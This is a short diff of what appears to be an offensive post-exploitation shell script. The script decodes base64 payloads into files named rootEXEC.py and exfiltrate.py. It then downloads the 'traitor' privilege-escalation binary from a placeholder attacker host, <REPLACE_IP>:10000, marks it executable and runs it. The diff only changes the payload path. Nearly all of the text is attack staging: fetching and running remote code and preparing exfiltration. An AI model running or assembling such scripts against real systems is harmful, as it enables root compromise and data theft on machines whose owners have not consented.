@@ -12,7 +12,7 @@ echo $py | base64 -d | cat > ./rootEXEC.py
 exfiltrate={EXFILTRATE_BASE64}
 echo $exfiltrate | base64 -d | cat > ./exfiltrate.py
 
-wget http://<REPLACE_IP>:10000/traitor-386 -O ./traitor
+wget http://<REPLACE_IP>:10000/payloads/traitor-386 -O ./traitor
 # wget https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-386 -O ./traitor
 chmod +x traitor
 ./traitor > traitor_out.txt
